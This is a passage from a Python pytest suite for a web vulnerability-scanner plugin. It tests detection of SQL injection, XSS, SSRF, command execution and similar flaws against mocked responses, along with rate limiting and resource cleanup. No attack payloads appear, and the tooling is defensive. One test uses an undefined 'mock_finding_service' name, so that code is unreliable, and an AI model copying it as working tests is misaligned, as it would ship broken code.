            mock_response = AsyncMock()
            url = args[0]
            path = urlparse(url).path
            mock_response.text = AsyncMock(return_value=mock_responses.get(path, ""))
            mock_response.url = url
            return mock_response
        
        mock_session.get.side_effect = mock_get
        
        # Execute plugin with concurrent scanning
        start_time = datetime.utcnow()
        results = await plugin.execute(TEST_URL)
        end_time = datetime.utcnow()
        
        # Verify performance
        scan_duration = (end_time - start_time).total_seconds()
        assert scan_duration < TEST_CONFIG['timeout']
        assert len(results) > 0
        
        # Verify all vulnerability types were detected
        detected_types = {r['type'] for r in results}
        expected_types = set(EXPECTED_RESULTS.keys())
        assert detected_types == expected_types
        
        # Verify concurrent request handling
        assert plugin.current_concurrent_requests <= TEST_CONFIG['max_concurrent_requests']
        assert plugin.total_requests > 0
        assert plugin.successful_requests > 0
        assert plugin.failed_requests >= 0

    @pytest.mark.asyncio
    async def test_resource_usage(self, plugin: VulnScannerPlugin,
                                mock_session: AsyncMock) -> None:
        """Test resource usage monitoring and management.
        
        Args:
            plugin: The plugin instance to test.
            mock_session: Mock aiohttp session.
        """
        # Mock responses for resource-intensive scanning
        mock_responses = {
            '/large': TEST_RESPONSES['large_response'],
            '/normal': TEST_RESPONSES['xss_reflected'],
            '/empty': TEST_RESPONSES['empty_response']
        }
        
        async def mock_get(*args: Any, **kwargs: Any) -> AsyncMock:
            mock_response = AsyncMock()
            url = args[0]
            path = urlparse(url).path
            mock_response.text = AsyncMock(return_value=mock_responses.get(path, ""))
            mock_response.url = url
            return mock_response
        
        mock_session.get.side_effect = mock_get
        
        # Execute plugin
        await plugin.execute(TEST_URL)
        
        # Verify resource usage
        assert plugin.memory_usage <= TEST_CONFIG['max_memory_usage']
        assert plugin.file_handles <= TEST_CONFIG['max_file_handles']
        assert plugin.db_connections <= TEST_CONFIG['max_db_connections']
        
        # Verify resource cleanup
        await plugin.cleanup()
        assert plugin.memory_usage == 0
        assert plugin.file_handles == 0
        assert plugin.db_connections == 0

    @pytest.mark.asyncio
    async def test_rate_limiting(self, plugin: VulnScannerPlugin,
                               mock_session: AsyncMock) -> None:
        """Test rate limiting compliance.
        
        Args:
            plugin: The plugin instance to test.
            mock_session: Mock aiohttp session.
        """
        # Mock response
        mock_response = AsyncMock()
        mock_response.text = AsyncMock(return_value=TEST_RESPONSES['xss_reflected'])
        mock_session.get.return_value.__aenter__.return_value = mock_response
        
        # Execute multiple requests
        start_time = datetime.utcnow()
        for _ in range(TEST_CONFIG['rate_limit'] * 2):
            await plugin.execute(TEST_URL)
        end_time = datetime.utcnow()
        
        # Verify rate limiting
        duration = (end_time - start_time).total_seconds()
        min_duration = (TEST_CONFIG['rate_limit'] * 2) / TEST_CONFIG['rate_limit']
        assert duration >= min_duration
        
        # Verify rate limit compliance
        assert plugin.current_rate <= TEST_CONFIG['rate_limit']
        assert plugin.total_requests > 0
        assert plugin.rate_limited_requests >= 0

class TestPluginExecution:
    """Test complete plugin execution."""
    
    @pytest.mark.asyncio
    async def test_execute_with_no_findings(self, plugin: VulnScannerPlugin, 
                                          mock_session: AsyncMock) -> None:
        """Test plugin execution with no findings.
        
        Args:
            plugin: The plugin instance to test.
            mock_session: Mock aiohttp session.
        """
        # Mock response with no vulnerabilities
        mock_response = AsyncMock()
        mock_response.text = AsyncMock(return_value="<html><body>No vulnerabilities</body></html>")
        mock_response.url = TEST_URL
        mock_session.get.return_value.__aenter__.return_value = mock_response
        
        # Execute plugin
        results = await plugin.execute(TEST_URL)
        
        # Verify results
        assert results == []
        mock_finding_service.add_or_update_finding.assert_not_called()
        
        # Verify plugin state
        assert plugin.total_requests > 0
        assert plugin.successful_requests > 0
        assert plugin.failed_requests == 0
        assert plugin.current_rate == 0
        assert plugin.memory_usage > 0
        assert plugin.file_handles > 0
        assert plugin.db_connections > 0
        
        # Verify cleanup
        await plugin.cleanup()
        assert plugin.memory_usage == 0
        assert plugin.file_handles == 0
        assert plugin.db_connections == 0

    @pytest.mark.asyncio
    async def test_execute_with_findings(self, plugin: VulnScannerPlugin, 
                                       mock_session: AsyncMock,
                                       mock_finding_service: AsyncMock) -> None:
        """Test plugin execution with findings.
        
        Args:
            plugin: The plugin instance to test.
            mock_session: Mock aiohttp session.
            mock_finding_service: Mock finding service.
        """
        # Mock responses for different scan types
        mock_responses = {
            '/login': TEST_RESPONSES['sql_error'],
            '/search': TEST_RESPONSES['xss_reflected'],
            '/redirect': "https://google.com",
            '/include': TEST_RESPONSES['file_inclusion'],
            '/exec': TEST_RESPONSES['command_output'],
            '/fetch': TEST_RESPONSES['ssrf_detected'],
            '/template': TEST_RESPONSES['template_error'],
            '/csrf': TEST_RESPONSES['csrf_error']
        }
        
        async def mock_get(*args: Any, **kwargs: Any) -> AsyncMock:
            mock_response = AsyncMock()
            url = args[0]
            path = urlparse(url).path
            mock_response.text = AsyncMock(return_value=mock_responses.get(path, ""))
            mock_response.url = url
            return mock_response
        
        mock_session.get.side_effect = mock_get
        
        # Execute plugin
        start_time = datetime.utcnow()
        results = await plugin.execute(TEST_URL)
        end_time = datetime.utcnow()
        
        # Verify results
        assert len(results) > 0
        assert all(r['type'] in EXPECTED_RESULTS for r in results)
        assert all(r['severity'] == EXPECTED_RESULTS[r['type']]['severity'] for r in results)
        assert all(r['stage'] == EXPECTED_RESULTS[r['type']]['stage'] for r in results)
        assert all(r['status'] == EXPECTED_RESULTS[r['type']]['status'] for r in results)
        
        # Verify performance
        scan_duration = (end_time - start_time).total_seconds()
        assert scan_duration < TEST_CONFIG['timeout']
        assert plugin.current_concurrent_requests <= TEST_CONFIG['max_concurrent_requests']
        
        # Verify finding service call
        mock_finding_service.add_or_update_finding.assert_called_once()
        call_args = mock_finding_service.add_or_update_finding.call_args[1]
        finding_data = call_args['finding_data']
        
        # Verify finding data
        assert finding_data['root_domain'] == TEST_DOMAIN
        assert finding_data['subdomain'] == TEST_SUBDOMAIN
        assert finding_data['source'] == 'vulnerability_scan'
        assert finding_data['stage'] == 'vuln'
        assert finding_data['status'] == 'active'
        
        # Verify finding metadata
        metadata = json.loads(finding_data['metadata'])
        assert metadata['scan_type'] == 'comprehensive'
        assert metadata['vulnerabilities_found'] == len(results)
        assert all(vuln_type in metadata['vulnerabilities_by_type'] 
                  for vuln_type in EXPECTED_RESULTS.keys())
        assert 'scan_timestamp' in metadata
        assert 'scan_details' in metadata
        assert 'scan_duration' in metadata
        assert 'scan_stats' in metadata
        
        # Verify scan statistics
        stats = metadata['scan_stats']
        assert stats['total_requests'] == plugin.total_requests
        assert stats['successful_requests'] == plugin.successful_requests
        assert stats['failed_requests'] == plugin.failed_requests
        assert stats['rate_limited_requests'] == plugin.rate_limited_requests
        assert stats['memory_usage'] == plugin.memory_usage
        assert stats['file_handles'] == plugin.file_handles
        assert stats['db_connections'] == plugin.db_connections
        
        # Verify cleanup
        await plugin.cleanup()
        assert plugin.memory_usage == 0
        assert plugin.file_handles == 0
        assert plugin.db_connections == 0

    @pytest.mark.asyncio
    async def test_execute_with_partial_findings(self, plugin: VulnScannerPlugin,
                                               mock_session: AsyncMock,
                                               mock_finding_service: AsyncMock) -> None:
        """Test plugin execution with partial findings (some scans fail).
        
        Args:
            plugin: The plugin instance to test.
            mock_session: Mock aiohttp session.
            mock_finding_service: Mock finding service.
        """
        # Mock mixed responses (some successful, some failed)
        mock_responses = {
            '/login': TEST_RESPONSES['sql_error'],  # Success
            '/search': aiohttp.ClientError("Network error"),  # Failure
            '/redirect': "https://google.com",  # Success
            '/include': asyncio.TimeoutError("Request timeout"),  # Failure
            '/exec': TEST_RESPONSES['command_output'],  # Success
            '/fetch': aiohttp.ClientSSLError("SSL error"),  # Failure
            '/template': TEST_RESPONSES['template_error'],  # Success
            '/csrf': TEST_RESPONSES['csrf_error']  # Success
        }
        
        async def mock_get(*args: Any, **kwargs: Any) -> AsyncMock:
            url = args[0]
            path = urlparse(url).path
            response = mock_responses.get(path)
            
            if isinstance(response, Exception):
                raise response
                
            mock_response = AsyncMock()
            mock_response.text = AsyncMock(return_value=response)
            mock_response.url = url
            return mock_response
        
        mock_session.get.side_effect = mock_get
        
        # Execute plugin
        results = await plugin.execute(TEST_URL)
        
        # Verify results
        assert len(results) > 0
        assert len(results) < len(mock_responses)  # Some scans failed
        assert all(r['type'] in EXPECTED_RESULTS for r in results)
        assert all(r['severity'] == EXPECTED_RESULTS[r['type']]['severity'] for r in results)
        assert all(r['stage'] == EXPECTED_RESULTS[r['type']]['stage'] for r in results)
        assert all(r['status'] == EXPECTED_RESULTS[r['type']]['status'] for r in results)
        
        # Verify error handling
        assert plugin.failed_requests > 0
        assert plugin.successful_requests > 0
        assert plugin.total_requests == plugin.successful_requests + plugin.failed_requests
        
        # Verify finding service call
        mock_finding_service.add_or_update_finding.assert_called_once()
        call_args = mock_finding_service.add_or_update_finding.call_args[1]
        finding_data = call_args['finding_data']
        metadata = json.loads(finding_data['metadata'])
        
        # Verify scan statistics
        stats = metadata['scan_stats']
        assert stats['total_requests'] == plugin.total_requests
        assert stats['successful_requests'] == plugin.successful_requests
        assert stats['failed_requests'] == plugin.failed_requests
        assert 'error_details' in stats
        assert len(stats['error_details']) == plugin.failed_requests
        
        # Verify cleanup
        await plugin.cleanup()
        assert plugin.memory_usage == 0
        assert plugin.file_handles == 0
        assert plugin.db_connections == 0 